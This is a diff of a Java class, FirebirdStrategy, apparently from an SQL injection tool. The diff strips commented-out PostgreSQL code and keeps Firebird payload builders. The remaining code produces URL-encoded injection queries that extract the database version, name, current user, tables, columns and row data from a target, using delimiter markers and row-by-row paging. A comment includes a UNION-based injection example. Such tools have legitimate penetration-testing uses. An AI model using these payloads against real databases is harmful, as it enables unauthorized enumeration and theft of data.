@@ -13,135 +13,32 @@ public class FirebirdStrategy implements ISQLStrategy {
     @Override
     public String getSchemaInfos() {
         return 
-//                "" +
-//                    "" +
-//                        "'{%}'," +
-//                        "version()," +
-//                        "current_database()," +
-//                        "user," +
-//                        "session_user" +
-//                    "" +
-//                "" +
-//                "||" +
-//                "'%01%03%03%07'";
             "SELECT+rdb$get_context('SYSTEM','ENGINE_VERSION')||'{%}'||rdb$get_context('SYSTEM','DB_NAME')"
             + "||'{%}'||rdb$get_context('SYSTEM','CURRENT_USER')||'{%}?%01%03%03%07'from+rdb$database";
-//        return 
-//                "encode(" +
-//                    "concat_ws(" +
-//                        "'{%}'," +
-//                        "version()," +
-//                        "current_database()," +
-//                        "user," +
-//                        "session_user" +
-//                    ")::bytea" +
-//                ",'hex')" +
-//                "||" +
-//                "'i'";
-//        return "SELECT+version||'{%}'||SYS.DATABASE_NAME||'{%}'||user||'{%}'||user||'%01%03%03%07'FROM+v%24instance";
-
     }
 
     @Override
     public String getSchemaList() {
         return 
-//                "select+array_to_string(array(" +
-//                    "select" +
-//                        "'%04'||" +
-//                        "r||" +
-//                        "'%05'||" +
-//                        "q::text||" +
-//                        "'%04'" +
-//                    "from(" +
-//                        "SELECT+" +
-//                            "tables.table_schema+r," +
-//                            "count(table_name)q+" +
-//                        "FROM+" +
-//                            "information_schema.tables+" +
-//                        "group+by+r+" +
-//                        "order+by+r{limit}" +
-//                    ")x" +
-//                "),'%06')" +
-//                "||" +
-//                "'%01%03%03%07'";
-        
-                /**
-                 * aggreg function return exec fault
-                 * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
-                 * => use limit 1,1 instead 
-                 */
-                "select+'%04'||rdb$get_context('SYSTEM','DB_NAME')||'%050%04%01%03%03%07'from+rdb$database{limit}";
-//        return 
-//                "select+array_to_string(array(" +
-//                    "select" +
-//                        "'hh'||" +
-//                        "r||" +
-//                        "'jj'||" +
-//                        "encode(q::text::bytea,'hex')||" +
-//                        "'hh'" +
-//                    "from(" +
-//                        "SELECT+" +
-//                            "encode(tables.table_schema::bytea,'hex')r," +
-//                            "count(table_name)q+" +
-//                        "FROM+" +
-//                            "information_schema.tables+" +
-//                        "group+by+r+" +
-//                        "order+by+r{limit}" +
-//                    ")x" +
-//                "),'gg')" +
-//                "||" +
-//                "'i'";
+            /**
+             * aggreg function return exec fault
+             * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
+             * => use limit 1,1 instead 
+             */
+            "select+'%04'||rdb$get_context('SYSTEM','DB_NAME')||'%050%04%01%03%03%07'from+rdb$database{limit}";
     }
 
     @Override
     public String getTableList(Database database) {
         return
-//            "select+array_to_string(array(" +
-//                "select" +
-//                    "'%04'||" +
-//                    "r||" +
-//                    "'%05'||" +
-//                    "q::text||" +
-//                    "'%04'" +
-//                "from(" +
-//                    "SELECT+" +
-//                        "tables.table_name+r,'0'q+" +
-//                    "FROM+" +
-//                        "information_schema.tables+" +
-//                    "where+tables.TABLE_SCHEMA='" + database.toString() + "'" +
-//                    "order+by+r{limit}" +
-//                ")x" +
-//            "),'%06')" +
-//            "||" +
-//            "'%01%03%03%07'";
-                "SELECT'%04'||trim(rdb$relation_name)||'%050%04%01%03%03%07'from+rdb$relations{limit}";
+            "SELECT'%04'||trim(rdb$relation_name)||'%050%04%01%03%03%07'from+rdb$relations{limit}";
 
     }
 
     @Override
     public String getColumnList(Table table) {
         return
-//            "select+array_to_string(array(" +
-//                "select" +
-//                    "'%04'||" +
-//                    "r||" +
-//                    "'%05'||" +
-//                    "q::text||" +
-//                    "'%04'" +
-//                "from(" +
-//                    "SELECT+" +
-//                        "columns.column_name+r,'0'q+" +
-//                    "FROM+" +
-//                        "information_schema.columns+" +
-//                    "where+columns.TABLE_SCHEMA='" + table.getParent().toString() + "'" +
-//                    "and+columns.TABLE_name='" + table.toString() + "'" +
-//                    "order+by+r{limit}" +
-//                ")x" +
-//            "),'%06')" +
-//            "||" +
-//            "'%01%03%03%07'";
-        "SELECT'%04'||trim(rdb$field_name)||'%050%04%01%03%03%07'from+rdb$relation_fields+where+rdb$relation_name='" + table + "'{limit}";
-
+            "SELECT'%04'||trim(rdb$field_name)||'%050%04%01%03%03%07'from+rdb$relation_fields+where+rdb$relation_name='" + table + "'{limit}";
     }
 
     @Override
@@ -150,24 +47,7 @@ public class FirebirdStrategy implements ISQLStrategy {
         formatListColumn = "trim(coalesce(" + formatListColumn + ",''))";
         
         return
-//            "select+array_to_string(array(" +
-//                "select" +
-//                    "'%04'||" +
-//                    "r||" +
-//                    "'%05'||" +
-//                    "q::text||" +
-//                    "'%04'" +
-//                "from(" +
-//                    "SELECT+" +
-//                        "substr((" + formatListColumn + "),1,775)r,count(*)q+" +
-//                    "FROM+" +
-//                        "" + database + "." + table + "+" +
-//                    "group+by+r{limit}" +
-//                ")x" +
-//            "),'%06')" +
-//            "||" +
-//            "'%01%03%03%07'";
-        "SELECT'%04'||" + formatListColumn + "||'%050%04%01%03%03%07'from+" + table + "{limit}";
+            "SELECT'%04'||" + formatListColumn + "||'%050%04%01%03%03%07'from+" + table + "{limit}";
     }
 
     @Override
@@ -303,9 +183,11 @@ public class FirebirdStrategy implements ISQLStrategy {
 
     @Override
     public String getLimit(Integer limitSQLResult) {
-//        return "+limit+" + limitSQLResult + ",65536";
-//        return "+limit+65536+offset+" + limitSQLResult;
         return "+ROWS+" + (limitSQLResult+1) + "+TO+" + (limitSQLResult+1) + "";
     }
-
+    
+    @Override
+    public String getDbLabel() {
+        return null;
+    }
 }
